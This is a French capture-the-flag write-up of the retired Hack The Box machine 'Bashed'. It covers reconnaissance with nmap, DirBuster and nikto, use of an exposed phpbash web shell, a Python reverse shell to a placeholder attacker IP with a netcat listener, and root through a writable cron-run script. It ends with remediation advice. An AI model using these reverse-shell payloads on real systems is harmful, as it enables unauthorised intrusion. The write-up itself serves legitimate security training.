---
title: Restez calme et piratez The Box - Bashed
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2021-02-26T22:12:20.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-bashed
coverImage: https://www.freecodecamp.org/news/content/images/2021/02/night-city-cyberpunk-2077-1920-1080-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
- name: Security
  slug: security
seo_title: Restez calme et piratez The Box - Bashed
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en tests d'intrusion.

Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note** : _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2021/01/Screenshot-2021-01-05-at-00.03.21.png)

Bashed est une machine facile qui se concentre sur le fuzzing et la localisation de fichiers importants. Des connaissances de base sur Linux et les cron jobs sont nécessaires.

Nous utiliserons les outils suivants pour pirater la machine sur une [boîte Kali Linux](https://www.kali.org/) :

* nmap
* dirbuster
* nikto
* netcat

Commençons !

## **Étape 1 - Reconnaissance**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

### **Scan des ports**

J'utiliserai **Nmap** (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité.

Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2021/01/Screenshot-2021-01-05-at-00.08.12.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v 10.129.90.251
```

**-A** : Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v** : Augmente le niveau de verbosité

**10.129.90.251** : Adresse IP de la machine Bashed

Si vous trouvez les résultats un peu trop écrasants, vous pouvez essayer ceci :

```bash
nmap 10.129.90.251
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.04.49.png)

Nous pouvons voir qu'il y a 1 port ouvert :

**Port** 80, le plus souvent utilisé par le protocole Hypertext Transfer Protocol (HTTP).

### **Scan des répertoires**

Toujours dans la phase de scanning et de reconnaissance, j'utilise maintenant **DirBuster**. DirBuster est une application Java multithread conçue pour forcer brutalement les répertoires et les noms de fichiers sur les serveurs web/applications.

Vous pouvez lancer DirBuster en tapant cette commande dans le terminal :

```bash
dirbuster
```

L'application ressemble à ceci, où vous pouvez spécifier l'URL cible. Dans notre cas, ce sera **http://10.129.90.251**. Vous pouvez sélectionner une liste de mots avec la liste des **répertoires/fichiers** en cliquant sur le bouton Parcourir :

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.10.29.png)

J'utilise le fichier **directory-list-2.3-medium.txt** pour cette recherche. Nous pouvons voir beaucoup de fichiers ici :

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.20.55.png)

Je vois quelques répertoires intéressants à vérifier (/uploads, /dev, /php).

J'utilise ensuite **Nikto**. 

> Nikto est un scanner de serveur web Open Source qui effectue des tests complets contre les serveurs web pour plusieurs éléments, vérifie les versions obsolètes de plus de 1250 serveurs, et les problèmes spécifiques à la version sur plus de 270 serveurs. 
> 
> Il vérifie également les éléments de configuration du serveur tels que la présence de plusieurs fichiers index, les options du serveur HTTP, et tentera d'identifier les serveurs web et logiciels installés.

Vous pouvez trouver plus d'informations sur l'outil [ici](https://tools.kali.org/information-gathering/nikto).

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.25.01.png)

J'utilise cette commande pour lancer le scan

```bash
nikto -host 10.129.90.251
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.23.46.png)

Je peux voir quelques répertoires intéressants (/dev, /php). 

## **Étape 2 - Visite de la page web**

Visons les pages que nous avons trouvées lors de la phase de reconnaissance, et commençons par la page web principale. Il semble que ce soit un blog sur le développement.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.28.03.png)

Je clique sur l'article **phpbash**. La page explique ce que c'est et donne un lien vers un dépôt GitHub.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.31.28.png)

Je vérifie le dépôt GitHub.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.29.55.png)
_[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)_

Je navigue ensuite vers le dossier **/dev**. Il semble que le développeur ait téléchargé son code sur le site web. 

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.27.16.png)

Je clique sur **phpbash.php** et j'ai accès à un shell dans le navigateur à l'adresse

```bash
http://10.129.90.251/dev/phpbash.php
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.33.02.png)

## **Étape 3 - Recherche du flag user.txt**

Je peux lister tous les fichiers/dossiers avec la commande suivante :

```bash
ls -la
```

Je me déplace ensuite dans le dossier **home** avec :

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.35.56.png)

Je trouve le dossier **arrexel**.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.36.05.png)

Je navigue dans ce dossier et je trouve le flag utilisateur ! Je vérifie le contenu du fichier avec :

```bash
cat user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.37.13.png)

## **Étape 4 - Élévation de privilèges**

J'ai besoin d'un shell approprié pour l'élévation de privilèges. Dans la fenêtre **phpbash**, j'exécute la commande suivante :

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VOTRE_IP_MACHINE",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Je configure un écouteur **Netcat** sur le port **1234** pour attraper la connexion du reverse shell.

> Ncat est un utilitaire réseau riche en fonctionnalités qui lit et écrit des données à travers les réseaux à partir de la ligne de commande. 
> 
> Ncat a été écrit pour le projet Nmap comme une réimplémentation grandement améliorée du vénérable [Netcat](http://sectools.org/tool/netcat/). Il utilise à la fois TCP et UDP pour la communication et est conçu pour être un outil back-end fiable pour fournir instantanément une connectivité réseau à d'autres applications et utilisateurs.

Vous pouvez en savoir plus sur Netcat [ici](https://nmap.org/book/ncat-man.html).

```bash
nc -nvlp 1234
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.58.16.png)

J'ai obtenu un shell et je vérifie qui je suis avec

```bash
whoami
```

puis j'exécute

```bash
sudo -l
```

pour comprendre quelles commandes je peux exécuter sur localhost.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.59.12.png)

Passons à **scriptmanager** pour vérifier si cet utilisateur a accès à un dossier auquel www-data ne pourrait pas accéder. Mais d'abord, je génère un shell approprié avec la commande

```bash
python -c 'import pty; pty.spawn("/bin/bash");'
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.04.34.png)

Je passe ensuite à l'utilisateur **scriptmanager** avec la commande

```bash
sudo -u scriptmanager /bin/bash
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.04.47.png)

Je navigue ensuite vers le dossier **/scripts** et je vois deux fichiers (**test.py** et **test.txt**).

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.06.54.png)

Le fichier **test.txt** est détenu par root et semble être le résultat du script **test.py** qui est détenu par scriptmanager.

Je vérifie le contenu de **test.py** avec

```bash
cat test.py
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.07.56.png)

et le contenu de **test.txt** avec

```bash
cat test.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.10.28.png)

Je liste tous les fichiers une fois de plus et je vois que l'heure pour **test.txt** a changé. Nous pouvons supposer qu'il y a un cron job qui exécute le script **test.py** depuis le dossier **/scripts**.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.10.57.png)

Écrivons un exploit avec

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VOTRE_IP_MACHINE",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py
```

et sauvegardons-le sous **exploit.py**.

Je supprime le fichier **test.py** avec

```
rm test.py
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.22.35.png)

Je configure un autre écouteur **Netcat** sur le port **1235** pour attraper la connexion du reverse shell.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.23.08.png)

Je suis maintenant root !

Je liste les cron jobs pour vérifier mon hypothèse avec

```
crontab -l
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.27.25.png)

Le cron job exécute les fichiers Python dans le dossier **/scripts**.

## **Étape 5 - Recherche du flag root.txt**

Trouvons maintenant le flag root. Je navigue jusqu'à **root**.

Je trouve le fichier root.txt et je vérifie son contenu avec

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.26.45.png)

Félicitations ! Vous avez trouvé les deux flags.

## **Remédiations**

* Appliquez le [principe du moindre privilège](https://en.wikipedia.org/wiki/Principle_of_least_privilege) à tous vos systèmes et services
* Les fichiers ou répertoires sensibles ne doivent pas être hébergés sur un serveur ou accessibles publiquement. Une reconnaissance rapide permettra à un attaquant d'énumérer les dossiers/fichiers et d'y accéder

N'hésitez pas à poser des questions ou à partager avec vos amis :)

Vous pouvez voir plus d'articles de la série **Restez calme et piratez The Box** [ici](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

![Image](https://www.freecodecamp.org/news/content/images/2021/02/night-city-cyberpunk-2077-1920-1080.jpg)